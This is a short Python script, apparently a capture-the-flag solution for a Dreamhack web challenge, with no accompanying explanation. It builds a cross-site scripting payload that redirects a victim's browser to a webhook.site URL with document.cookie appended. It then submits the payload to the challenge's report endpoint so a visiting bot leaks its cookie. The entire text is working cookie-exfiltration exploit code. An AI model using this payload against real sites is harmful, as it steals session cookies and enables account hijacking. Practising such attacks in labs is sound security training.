import requests
import urllib.parse

URL = "http://host8.dreamhack.games:17042"  
WEBHOOK_URL = "https://webhook.site/461c0716-98ab-4bd0-88a0-d251f3ccb13d" 
XSS = "http://127.0.0.1:8000/xss"
html = '<div data-code=""></div>'
hash = f"window.location='{WEBHOOK_URL}?c='+document.cookie"

payload = f"{XSS}?payload={html}#{hash}"

print(f"[+] payload: {payload}")

r = requests.post(f"{URL}/report", data={
    "payload": payload
})

print(f"[+] Status: {r.status_code}")
print(f"[+] Response: {r.text}")